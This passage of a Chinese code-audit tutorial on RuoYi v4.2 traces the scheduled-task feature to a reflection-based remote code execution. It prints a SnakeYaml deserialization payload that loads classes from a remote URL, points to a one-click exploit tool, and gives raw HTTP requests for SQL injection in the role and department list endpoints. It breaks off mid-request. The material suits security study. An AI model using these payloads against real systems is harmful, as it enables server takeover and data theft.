打开 controller 文件下，有两个代码文件，分别是 SysJobController 和SysJobLogController
。根据代码注释了解了大致作用，如下图所示：
现在，我们对 SysJobController下的run方法 进行追踪，根据注释该方法为任务调 度立即执行一次，如下图所示：
Ctrl加鼠标左键点击 jobService.run(job) ，进入Service层后，无其他执行代码，继续跟踪到实现层，最终代码位于
RuoYi-v4.2\ruoyiquartz\src\main\java\com\ruoyi\quartz\service\impl\SysJobServiceImpl.java
第180行到188行。如下图所示：
第182,183行作用为通过调度任务ID查询调度信息。  
第185行，实例化了 JobDataMap 。 JobDataMap 通过它的超类org.quartz.util.DirtyFlagMap
实现了java.util.Map 接口，你可以向 JobDataMap 中存入键/值对，那些数据对可在你的 Job 类中传递和进行访问。这是一个向你的
Job 传送配置的信息便捷方法。简单说，Job 运行时的信息保存在 JobDataMap 实例中。  
最终在第187行，使用 scheduler.triggerJob(JobKey var1, DataMap var2)
为触发标识JobDetail（立即执行）。 JobDetail 用来描述Job的实现类及其它相关的静态信息，如Job名字、描述、关联监听器等等信息。其中
triggerJob() 方法需要两个参数，分别为 Jobkey 和 dataMap 。 dataMap 来自上面输入的运行时信息。而此处的 Jobkey
是JobDetail创建的的唯一标识。简单说，到了这就开始执行定时任务  
了。  
但最终方法的调用是在 QuartzDisallowConcurrentExecution 或QuartzJobExecution
中用JobInvokeUtil.invokeMethod(sysJob); 反射完成的。  
QuartzDisallowConcurrentExecution 或 QuartzJobExecution
两者区别根据代码注释可以知道一个禁止并发执行，一个允许并发执行。这两个参数也是可以从前端中设置的。但不论那种，最终都是调用的
JobInvokeUtil.invokeMethod(sysJob); 。  
进入 JobInvokeUtil.invokeMethod(sysJob); ，最终方法实现如下图所示：
解读一下。  
①、第25行到28行，为获取处理数据，打个端点可以直观看出来，如下图所示（建议自己动手操作看一下）：
②、第30到39行，有一个判断。若依支持两种方式调用，分别为支持 Bean 调用和Class 类调用。此处判断我理解为通过 beanname
判断是否为有效的classname。也就是调用目标字符串是使用 bean 方式调用，还是使用 Class 方式调用。  
此处，可以创建两种方式的目标字符串后，在 if(!isValidClassName(beanName)) 处打个断点，分别执行跟踪一下，就能看明白了。
另一种调用方式，大家动手自己打个断点操作一下。进入管理系统，访问 系统监控 -定时任务 ，选择bean方式调用的任务，点击 更多操作 - 执行一次 。  
至此，定时任务流程到这就结束了。他是如何RCE的呢？  
**漏洞简述**  
在对定时任务代码审计时发现该功能存在漏洞。在
添加任务->调用目标字符串处可操作class类，通过代码审计发现使用的反射方式，也就是说目标class类存在漏洞的话即可 利用反射触发RCE漏洞。  
**漏洞验证**  
在代码审计处，我们知道如果是调用class类，最终执行为 Object bean =
Class.forName(beanName).newInstance(); 。 问题来了，如果此处想要成功实例化并且RCE的话，那么必须满足几个条件：
    1、类的构造方法为Public
    2、类的构造方法无参
    3、调用目标字符串的参数为：支持字符串，布尔类型，长整型，浮点型，整型
    4、调用目标方法除了为Public，无参，还需要具有执行代码/命令的能力
有的朋友一开始会想到调用 java.lang.Runtime.getRuntime().exec("") 。但经
过上面条件的梳理，发现该类不满足条件，因为他的构造方法是private。  
在组件检测时发现了本项目使用了 SnakeYaml 。经过学习我们知道，该组件只要可以 控制 yaml.load() 即可触发反序列漏洞。 经过探索学习，
SnakeYaml的yaml.load() 是满足以上条件的，具体操作如下。  
**基础验证**  
①、先登录DNSlog平台，获取一个DNSlog地址。  
②、然后进入后台，访问 系统监控-定时任务 功能，点击新增，在目标字符串下添加如 下内容（即攻击payload）：
    org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager
    [!!java.net.URLClassLoader [[!!java.net.URL ["ftp://此处填入DNSlog地
    址"]]]]')
    ③、点击确定后，在该页面点击 更多操作-立即执行 后，即可在DNSlog处看到探测信 息，如下图所示：
**利用工具进一步攻击**  
推荐一款若依一键利用工具。项目地址：  根据该工具介绍如下图所示：
    ①、打开该工具后，填写一些配置，其中包括目标URL和Cookie，如下图所示：
②、然后点击确定，即开始漏洞检测。存在漏洞提示如下图所示：
## 2、单类漏洞审计
### 2.1、SQL注入
#### 2.1.1、注入点一
    POST /system/role/list HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    X-Requested-With: XMLHttpRequest
    Content-Length: 152
    Origin: http://127.0.0.1
    DNT: 1
    Connection: close
    Referer: http://127.0.0.1/system/role
    Cookie: JSESSIONID=d87f8245-697f-4f62-94f3-072abe50be83; 
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    roleName=&roleKey=&status=0&params%5BbeginTime%5D=&params%5BendTime%5D=&pageSize=10&pageNum=1&orderByColumn=roleSort&isAsc=asc&params%5BdataScope%5D=*
单点漏洞代码审计首当其冲当然要先看SQL注入漏洞是否存在，全局搜索关键字 $ ，并限定文件类型为 .xml ，发现 sysDeptMapper.xml 和
sysUserMapper.xml 有存在SQL注入的地方，如下图所示：
①、点击进入 SysRoleMapper.xml ，SQL注入点在第58行，使用 $ 直接拼接了参 数，如下图所示：
②、点击左侧箭头快速跳转到DAO层（IDEA中需要安装Free Mybatis plugin插件），如下 图所示 ：
③、键盘按住Ctrl加鼠标左键，点击 selectRoleList ，查看谁调用了它。最终来到 SysRoleServiceImpl 的实现层，如下图所示：
④、进入 SysRoleServiceImpl 后，再回溯到 SysRoleService 层，可使用左侧快 速跳转按钮。或者选中
selectRoleList 后使用快捷键 ctrl+u ，如下图所示：
⑤、键盘按住Ctrl加鼠标左键，点击 selectRoleList ，回溯到 Controller 层，最 终发现是 SysRoleController
调用了这个方法，如下图所示：
⑥、点击进入，最终定位到src\main\java\com\ruoyi\web\controller\system\SysRoleController.java
，第58行和第68行都有调用，如下图所示：
⑦、键盘按住Ctrl加鼠标左键，点击 SysRole ，进入看看定义了哪些实体类，其中发现了 DataScope ，如下图所示：
这里学个小知识：  
一对一映射，规定一个用户只能对应一个角色，其实在实际的RBAC权限系统中，一个用户往往对应多个角色，然后每个角色用对应多个权限，基于实际需求，现在通过用户-角色-权限这种一对多的关系来说明一对多映射实现方式。  
**一、collection 集合的嵌套结果映射**  
和association类似，集合的嵌套结果映射就是指通过一次 SQL 查询将所有的结果查询出来，然后通过配置的结果映射，将数据映射到不同的对象中去 。  
在SysUser类中增加 List roleList 属性用于存储用户对应的多个角色。如下：
⑧、回顾追溯流程  
回顾下整理流程，如下所示：sysRoleMapper.xml -> SysRoleMapper.java ->
SysRoleServiceImpl.java -> ISysRoleService.java ->
SysRoleController.java->SysRole.java  
sysRoleMapper.xml：注入点  
SysRoleMapper.java：DAO层  
SysRoleServiceImpl.java：执行 ISysRoleService实体类  
ISysRoleService.java：Service接口类  
SysRoleController.java：控制器  
SysRole.java：定义实体类
这里再强调一下之前说过的请求过程：
简单说，我们从 XxxxMapper 文件追踪到 Controller 层，主要就是在找漏洞入口。顺带看看整个流程是否对参数有特殊处理。  
⑨、汇总信息  
最后，我们将追溯的过程，以及有用的信息汇总一下。  
通过Controller层，我们可以知道，漏洞URL路径为 /system/role/list  
通过Service层和Controller层的注释，我们大致知道该功能位于角色信息处。
访问WEB页面，发现名叫角色管理的功能。 当然了，如果我们没有找到功能，也完全可以自己构造数据包。  
①、访问 角色管理 功能，通过点击下面的各个按钮，并配合BurpSuite抓包，发现 搜索 功能，会向 /system/role/list
接口发送数据，如下图所示：
②、发送到Repeater模块，发现请求Body中没有 DataScope ，没关系，我们照葫芦画 瓢自己添加上，最终如下图所示：
③、输入 单引号(') ，验证是否存在漏洞，发现返回了报错信息，如下图所示：
④、直接上SQLMAP，最终结果如下图所示：
#### 2.1.2、注入点二
这个注入点有好几个地方可以调用利用，可以自行研究，这里只举出一条
    POST /system/dept/list HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Content-Length: 41
    Origin: http://127.0.0.1
    DNT: 1
    Connection: close